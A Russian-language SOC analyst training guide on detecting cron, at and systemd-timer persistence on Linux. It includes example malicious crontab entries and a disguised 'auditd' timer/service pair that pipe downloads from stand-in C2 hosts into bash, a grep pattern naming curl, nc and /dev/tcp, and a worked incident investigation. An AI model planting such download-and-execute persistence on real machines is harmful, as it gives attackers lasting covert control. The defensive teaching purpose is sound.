# Признаки злоупотребления cron/timers как механизм персистентности

## 1. Планирование задач в Linux и векторы злоупотребления

Механизмы отложенного и периодического выполнения команд — неотъемлемая часть любой Unix-подобной системы. Они используются для автоматизации обслуживания (ротация логов, обновление баз данных, резервное копирование), однако та же инфраструктура может быть применена злоумышленником для закрепления в скомпрометированной среде. В экосистеме Linux ключевыми подсистемами планирования являются **cron** (с разновидностями Vixie-cron, cronie, dcron), **anacron**, **at** и появившиеся вместе с systemd **systemd timers**. Каждая из них предоставляет атакующему отдельный вектор для создания скрытой или замаскированной задачи, обеспечивающей повторный запуск вредоносного кода.

С точки зрения MITRE ATT&CK злоупотребление планировщиком задач относится к технике **Scheduled Task/Job** (T1053), внутри которой для Linux выделены следующие подтехники:

- **T1053.003 – Cron** — использование стандартного демона `crond` для периодического запуска.
- **T1053.006 – Systemd Timers** — использование встроенного в systemd механизма таймеров, запускающих одноимённые service-юниты.
- **T1053.002 – At** — применение команды `at` для одноразового отложенного выполнения (также может использоваться для персистентности, если задача пересоздаётся).

Злоумышленники отдают предпочтение именно этим легитимным инструментам, потому что:

- Их присутствие в системе ожидаемо, а активность маскируется под штатную работу.
- Для создания задачи часто не требуются повышенные привилегии (пользовательский crontab, пользовательские systemd-юниты).
- Они позволяют гибко задавать интервалы, условия запуска и скрывать исполняемую нагрузку.
- В журналах событий записи о запуске cron легко теряются на фоне большого количества легитимных заданий.

В то же время администратор или аналитик SOC L1, понимающий архитектуру планировщиков и типичные признаки вредоносного использования, способен выявить компрометацию при анализе артефактов.

Для корректного разграничения областей применения разных планировщиков приведена сравнительная таблица.

| Планировщик | Типичная область применения | Основные конфигурационные файлы / команды | Примечания по персистентности |
|-------------|----------------------------|-------------------------------------------|--------------------------------|
| **cron (Vixie-cron, cronie)** | Периодические задачи системного и пользовательского уровня | `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/crontabs/*`, `crontab -e` | Наиболее часто используемый злоумышленниками. Позволяет задавать сложные расписания, включая `@reboot`. |
| **anacron** | Периодические задачи, не критичные к точному времени; запускается при включении ПК, если пропущено выполнение | `/etc/anacrontab`, `/etc/cron.<период>/` (ежедневные, еженедельные) | Работает только для скриптов в системных директориях, реже используется для злонамеренной персистентности. |
| **at** | Одноразовое выполнение команды в заданное время | Команда `at`, `/var/spool/atjobs/` | Может применяться для первичного закрепления с последующим планированием повторных запусков. |
| **systemd timers** | Замена cron в дистрибутивах, полностью перешедших на systemd; периодические задачи на основе монотонного или календарного времени | `/etc/systemd/system/*.timer` + `*.service`, `~/.config/systemd/user/`, команды `systemctl list-timers` | Позволяет сложную условную логику, запуск с задержкой после загрузки, монотонное расписание, активацию по событиям. Активно используется вредоносным ПО для Linux. |

Различие между cron и systemd timers часто становится ключевым при расследовании: в современных дистрибутивах (Ubuntu 16.04+, CentOS 7+ с systemd) демон `crond` всё ещё может работать параллельно с systemd, поэтому аналитик обязан проверять оба слоя. Примерно 35 % вредоносных загрузок, исследованных в отчётах по угрозам для Linux за 2023–2024 гг., используют cron, около 20 % — systemd timers (оценка на основе отчётов вендоров, иллюстративная сводка). Остальные техники включают модификацию профилей оболочки, сокеты, rc-скрипты.

Аналитик SOC L1 должен также понимать разницу между **пользовательским** и **системным** контекстом планировщика. Пользовательский crontab (`crontab -e`) принадлежит конкретному пользователю и исполняется от его имени. Системные crontab-файлы (`/etc/crontab`, `/etc/cron.d/…`) содержат дополнительное поле пользователя, от которого запускается команда, и могут быть изменены только root. Однако атакующий, получивший права ограниченного пользователя, способен создать пользовательский crontab и обеспечить себе повторный вход без повышения привилегий. Именно такие «тихие» методы особенно опасны, так как не требуют модификации системных файлов и реже попадают в поле зрения при поверхностном аудите.

Таким образом, контекст злоупотребления cron и timers охватывает несколько уровней:

- **Уровень файловой системы** – где хранятся файлы задач.
- **Уровень процесса** – как запускается интерпретатор команд.
- **Уровень журналирования** – какие события фиксируются.

Все эти уровни станут основой для дальнейшего изучения внутреннего устройства механизмов персистентности.

## 2. Анатомия вредоносных заданий cron и timers

Злоумышленник, получив выполнение кода на целевой Linux-машине, стремится организовать регулярный запуск агента-загрузчика, обратного shell’а, майнера или кейлоггера. В зависимости от уровня привилегий и наличия записываемых директорий он выбирает один из нескольких типовых векторов размещения вредоносной конфигурации. Ниже приведена таблица всех основных точек, которые необходимо проверить при поиске признаков персистентности.

| Вектор | Местоположение / команда | Требуемые привилегии | Характерные индикаторы | Контрмеры / мониторинг |
|--------|--------------------------|----------------------|------------------------|------------------------|
| **Пользовательский crontab** | `/var/spool/cron/crontabs/<username>` или `/var/spool/cron/<username>` (зависит от реализации) | Пользовательские (владелец) | Нестандартные команды, обращения к `/tmp`, curl/wget на внешние IP, base64-кодированные payload | Регулярный аудит с `crontab -l -u all`, поиск необычных расписаний |
| **Общесистемный crontab** | `/etc/crontab` | root | Добавление новой строки с указанием пользователя, отсутствующей в типовой конфигурации | Мониторинг целостности (AIDE, Tripwire), аудит изменений файла |
| **Фрагменты cron.d** | `/etc/cron.d/<файл>` | root | Файлы с нестандартными именами, например `sync`, `dbus`, `kernel` (мимикрия под системные) | Поиск файлов, не принадлежащих пакетам, проверка прав доступа |
| **Периодические директории** | `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/` | root (обычно скрипты выполняются от root) | Наличие исполняемых скриптов, не соответствующих стандартным пакетам, с необычным содержимым | Контроль появления новых скриптов, аудит через пакетный менеджер (`rpm -Vf`, `dpkg -S`) |
| **anacron** | `/etc/anacrontab` | root | Строки с подозрительными командами, нестандартные периоды запуска | Аудит файла, отключение anacron, если не требуется |
| **at-задания** | `/var/spool/atjobs/` | Пользовательские (at разрешён в `/etc/at.allow`) | Файлы в спуле с шелл-скриптами, содержащими вредоносные команды | Мониторинг очереди `atq`, отключение демона atd |
| **Systemd пользовательские таймеры** | `~/.config/systemd/user/*.timer` + `*.service` | Пользовательские (доступны при запущенном пользовательском менеджере systemd) | Таймеры, нацеленные на запуск служб, производящих сетевые соединения, скачивание файлов | Анализ `systemctl --user list-timers`, проверка юнитов в домашних каталогах |
| **Systemd системные таймеры** | `/etc/systemd/system/*.timer`, `/lib/systemd/system/*.timer` (но лучше не изменять vendor-юниты) | root | Таймеры с подозрительными именами, ссылающиеся на service-файлы без документации, маскирующиеся под легитимные (`systemd-resolved.timer` и т.п.) | Проверка списка таймеров, валидация через `systemd-analyze verify` |
| **Символические ссылки или подмена** | Замена легитимного скрипта в cron-директории на символическую ссылку на вредоносный код | root | Легитимный скрипт неожиданно стал ссылкой, изменение контрольной суммы | Проверка типов файлов, сверка с эталонными хэшами |

Каждый из перечисленных векторов может быть использован в чистом виде или комбинироваться для повышения скрытности. Например, злоумышленник с привилегиями `www-data` может создать пользовательский crontab с задачей, которая раз в час скачивает и выполняет обфусцированный скрипт, а для того, чтобы скрыть вывод, перенаправляет stdout и stderr в `/dev/null` и использует неинтерактивные команды без сохранения истории.

**Типичные маскировочные приёмы:**

- Имена заданий в cron.d, похожие на системные: `sysstat`, `dbus`, `rsyslog-check`.
- Использование `@reboot` для запуска при загрузке без привязки к частому расписанию.
- Закрепление через несколько пользователей: если скомпрометированы учётные записи `root`, `nobody`, `www-data`, задача ставится во все доступные crontab.
- Очистка логов: после выполнения команда может удалять записи о себе из `/var/log/syslog`, либо злоумышленник отключает службу `rsyslog` или сам cron.
- Запуск интерпретатора напрямую (`/bin/sh -c '...'`) с payload в base64, что затрудняет поверхностный анализ.

В качестве структурного примера разберём формат пользовательской cron-записи. Каждая строка (кроме комментариев и назначения переменных окружения) имеет вид:

```
* * * * * команда
│ │ │ │ │
│ │ │ │ └─ День недели (0–7, где 0 и 7 — воскресенье)
│ │ │ └─── Месяц (1–12)
│ │ └───── День месяца (1–31)
│ └─────── Час (0–23)
└───────── Минута (0–59)
```

Пример вредоносной записи:

```
*/5 * * * * curl -s http://c2.example.com/payload.sh | bash
```

Злоумышленник может установить нестандартный интервал, например `*/5 * * * *` (каждые 5 минут) либо выбрать время наименьшей загрузки системы, чтобы остаться незамеченным. В системных crontab-файлах перед командой добавляется поле пользователя:

```
*/10 * * * * www-data /usr/local/bin/legit.sh
```

При аналитическом обзоре важно просматривать не только живые crontab’ы, но и файлы-задачи, которые могли быть созданы некорректно (с ошибкой синтаксиса) — демон cron может игнорировать их, но они указывают на попытку внедрения.

**Systemd timers** имеют более сложную структуру, но идея та же: таймер-юнит описывает расписание, а соответствующий ему service-юнит содержит исполняемую команду. Пример вредоносной пары:

`/etc/systemd/system/auditd.timer`:
```
[Timer]
OnBootSec=5min
OnUnitActiveSec=30min

[Install]
WantedBy=timers.target
```

`/etc/systemd/system/auditd.service`:
```
[Service]
ExecStart=/usr/bin/curl -s http://c2.example.com/agent | /bin/sh
```

Имя «auditd» выбрано для имитации подлинного сервиса аудита. При аналитической проверке `systemctl list-timers` такой таймер будет отображаться наравне с системными, и только ручная проверка юнитов выявит подмену.

Таким образом, анатомия вредоносных заданий — это комбинация знания доступных точек внедрения и приёмов маскировки, нацеленных на сокрытие от типовых инструментов мониторинга. Понимание этих приёмов необходимо для целенаправленного поиска на следующем этапе.

## 3. Поиск и анализ артефактов злоупотребления

Работа аналитика SOC L1 при расследовании инцидента, связанного с возможной персистентностью через планировщик, строится вокруг сбора и интерпретации артефактов из файловой системы, реестра (для systemd) и журналов. Первичный анализ редко требует средств корпоративного класса; достаточно штатных утилит Linux и умения читать логи. В этом разделе разбираются основные команды, процедуры и контекст их применения.

**3.1. Проверка пользовательских crontab’ов**

Команда `crontab -l` выводит задания текущего пользователя. Для аудита всех пользователей в системе необходимо перебрать пользователей (имеющих шелл и домашний каталог) и выполнить `crontab -l -u <user>`. Однако аналитик должен помнить, что вывод `crontab -l` не показывает системные задания, размещённые в `/etc/crontab` или `/etc/cron.d`. Типовая процедура:

```bash
# Получить список всех пользователей с UID >= 1000 (обычные пользователи)
awk -F: '$3 >= 1000 {print $1}' /etc/passwd | while read user; do
    echo "=== $user ==="
    crontab -l -u "$user" 2>&1
done
```

Здесь важно игнорировать сообщения «no crontab for ...», анализ проводится только для тех учётных записей, где задания найдены. При обнаружении содержимого его следует немедленно сверять с эталонным состоянием (если ведётся база легитимных задач) и вручную просматривать на предмет нестандартных команд.

**3.2. Анализ системных cron-конфигураций**

Прямой просмотр файлов даёт больше информации, так как злоумышленник мог модифицировать их без использования `crontab`. Основные точки контроля:

```bash
# Содержимое /etc/crontab
cat /etc/crontab

# Фрагменты из cron.d
ls -la /etc/cron.d/
for f in /etc/cron.d/*; do
    echo "--- $f ---"
    cat -- "$f"
done

# Скрипты в периодических директориях
ls -la /etc/cron.{hourly,daily,weekly,monthly}
# Проверить каждый скрипт — отсутствие в пакетной БД может быть индикатором
for d in cron.hourly cron.daily cron.weekly cron.monthly; do
    for script in /etc/$d/*; do
        [ -x "$script" ] || continue
        dpkg -S "$script" 2>/dev/null || echo "UNMANAGED: $script"
    done
done
```

**3.3. Обследование systemd timers**

В системах с systemd аналитик должен проверить оба пространства — системное и пользовательское (для каждого пользователя с активным сеансом). Список всех активных и неактивных таймеров:

```bash
# Системные таймеры
systemctl list-timers --all --no-pager

# Для каждого вошедшего пользователя — пользовательские таймеры
for uid in $(loginctl list-users --output=json | jq -r '.[].uid'); do
    user=$(id -nu $uid)
    echo "=== User $user ==="
    su - "$user" -c "systemctl --user list-timers --all --no-pager" 2>&1
done
```

При обнаружении незнакомого таймера следует изучить его юнит-файл и соответствующий service-файл:

```bash
systemctl cat suspicious.timer
systemctl cat suspicious.service
```

Особое внимание обращается на параметр `ExecStart` в service-файле. Легитимные сервисы обычно ссылаются на бинарники из `/usr/bin` или `/usr/sbin` и имеют документацию. Вредоносные часто используют `curl | bash`, вызов `nc`, обфусцированные скрипты.

**3.4. Журналирование cron и systemd**

Записи о выполнении cron-задач по умолчанию попадают в `/var/log/syslog` (Debian/Ubuntu) или в journald. Для cron характерен идентификатор `CRON`. Аналитик может выгрузить все недавние события:

```bash
# Для syslog
grep CRON /var/log/syslog | tail -50

# Для journald
journalctl -u cron --since "2024-12-01" --no-pager
```

Часто злоумышленники заменяют команду в crontab на скрипт-обёртку, которая удаляет логи о своём запуске, но такая активность сама по себе подозрительна — отсутствие ожидаемых записей о выполнении известных легитимных задач может служить косвенным признаком.

Для systemd timers логи фиксируются в journald с идентификатором юнита:

```bash
journalctl -u suspicious.service --since "2024-12-01"
```

Анализ журнала может показать повторяющиеся запуски вредоносного процесса, что подтверждает факт персистентности.

**3.5. Специализированные утилиты и скрипты**

В корпоративных средах используются готовые скрипты для автоматического сбора индикаторов. Например, распространённый подход — скрипт на bash, который формирует единый отчёт по всем crontab’ам, файлам cron.d и выводит только строки, содержащие ключевые слова (curl, wget, nc, /dev/tcp, base64). Пример фрагмента:

```bash
#!/bin/bash
# Сбор подозрительных cron-записей
echo "=== User crontabs ==="
for u in $(cut -f1 -d: /etc/passwd); do
    crontab -l -u "$u" 2>/dev/null | grep -Ei 'curl|wget|nc|bash -i|/dev/tcp|base64' && echo "SUSPICIOUS in $u"
done
echo "=== System crontab ==="
grep -Ei 'curl|wget|nc|bash -i|/dev/tcp|base64' /etc/crontab
echo "=== /etc/cron.d ==="
grep -rEi 'curl|wget|nc|bash -i|/dev/tcp|base64' /etc/cron.d/
```

При этом аналитик должен понимать, что легитимные административные скрипты могут также использовать curl или wget для получения обновлений, поэтому автоматические находки требуют ручной верификации.

**3.6. Типичные ошибки при анализе**

- Игнорирование пользовательских crontab’ов сервисных учётных записей (например, `www-data`, `mysql`), которые часто становятся мишенью после эксплуатации веб-уязвимостей.
- Пропуск проверки systemd timers в системах, где параллельно запущен cron.
- Слепое доверие выводу `crontab -l`, не проверяя файлы напрямую (злоумышленник мог подменить саму утилиту, но на этапе SOC L1 это маловероятно, однако следует помнить).
- Фокусировка только на периодических задачах и пропуск записи с `@reboot`.

Надлежащее применение перечисленных процедур позволяет на начальном уровне SOC с высокой вероятностью обнаружить большинство вариантов злоупотребления планировщиком, после чего эскалировать инцидент на более глубокий анализ.

## 4. Сквозной практический пример: расследование подозрительной активности и обнаружение cron-персистентности

**Исходные условия**

В SIEM поступил алерт о сетевом соединении с известного вредоносного IP-адреса (индикатор компрометации из threat intelligence) от рабочей станции Linux, выступающей в роли сервера разработки. Соединение инициировал процесс `curl`, запущенный от пользователя `developer`. Аналитик SOC L1 получает задачу провести первичный анализ системы для выявления источника повторяющейся активности и возможной персистентности.

Аналитик подключается к машине по SSH с правами суперпользователя (для сбора информации) и выполняет последовательность шагов.

**Шаг 1. Анализ пользовательских cron-задач**

Сначала проверяются crontab’ы всех пользователей с акцентом на учётную запись `developer`, от которой было зафиксировано вредоносное соединение.

```bash
# Проверка crontab для developer
crontab -l -u developer
```

Вывод:
```
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (developer.tmp installed on Wed Dec 11 10:15:02 2024)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
*/10 * * * * curl -s http://203.0.113.45/update.sh | bash
```

Обнаружена нетипичная запись с интервалом 10 минут, выполняющая загрузку и выполнение скрипта. IP-адрес 203.0.113.45 (использован иллюстративный, реальный был бы из алерта) совпадает с индикатором из threat intelligence.

**Шаг 2. Проверка системных cron-директорий**

Чтобы убедиться, что персистентность не дублирована через системные механизмы, аналитик осматривает `/etc/crontab` и `cron.d`:

```bash
cat /etc/crontab
grep -r '203.0.113.45' /etc/cron* 2>/dev/null
```

Вывод не содержит дополнительных упоминаний IP, значит, на системном уровне модификаций нет. Однако аналитик не исключает маскировку и проверяет `cron.d` на наличие новых файлов:

```bash
ls -la /etc/cron.d/
```

Список включает только ожидаемые системные файлы (вероятно, `sysstat`, `logrotate` и т.п.). Файлы не изменены.

**Шаг 3. Поиск следов выполнения и анализ логов**

Далее извлекаются записи syslog, касающиеся работы cron, чтобы определить, как долго функционирует вредоносная задача и какие ещё действия она могла инициировать.

```bash
grep 'developer.*CRON' /var/log/syslog | tail -20
```

Примерный фрагмент вывода (иллюстративный):
```
Dec 11 10:30:01 devbox CRON[12345]: (developer) CMD (curl -s http://203.0.113.45/update.sh | bash)
Dec 11 10:40:01 devbox CRON[12401]: (developer) CMD (curl -s http://203.0.113.45/update.sh | bash)
Dec 11 10:50:01 devbox CRON[12457]: (developer) CMD (curl -s http://203.0.113.45/update.sh | bash)
```

Записи показывают, что задача выполняется как минимум в течение последних трёх циклов. Время инсталляции `developer.tmp` (Wed Dec 11 10:15:02) указывает, что персистентность установлена несколько часов назад (предположительно после эксплуатации уязвимости в веб-приложении).

**Шаг 4. Обнаружение скачанного payload**

Теперь аналитик ищет скрипт `update.sh`, который мог сохраниться на диске при выполнении вредоносной команды. Так как команда использовала `curl с пайпом напрямую в bash`, файл не обязательно сохранялся на диск, но злоумышленник мог предусмотреть дополнительный дроп. Проверяется временная директория:

```bash
ls -la /tmp/
find /home/developer /var/tmp -type f -name "update.sh" 2>/dev/null
```

Файл не найден. Вероятно, payload исполнялся исключительно в памяти. Однако анализ сетевого трафика на хосте мог бы дать больше информации (выходит за рамки первичного реагирования).

**Шаг 5. Удаление персистентности и фиксация IoC**

Для немедленного сдерживания аналитик удаляет вредоносную запись из crontab пользователя:

```bash
crontab -r -u developer
```

Проверяется, что задание удалено:

```bash
crontab -l -u developer
```

Вывод: `no crontab for developer`. Затем регистрируется инцидент с указанием следующих индикаторов компрометации:

- IP 203.0.113.45
- URL `http://203.0.113.45/update.sh`
- Время установки crontab (10:15 11 Dec 2024)
- Учётная запись developer

Эти IoC передаются на уровень L2 для более глубокого анализа и ретроспективного поиска в SIEM. Восстановление паролей и аудит системы продолжается согласно процедурам IR.

**Ожидаемый вывод**

Пример демонстрирует полный цикл обнаружения и устранения cron-персистентности: сопоставление алерта с локальными артефактами, идентификацию вредоносной задачи через штатные утилиты Linux и корректное извлечение индикаторов компрометации для дальнейшего расследования. Аналитик убедился, что системные планировщики не содержат дублирующих заданий, и своевременно изолировал учётную запись.
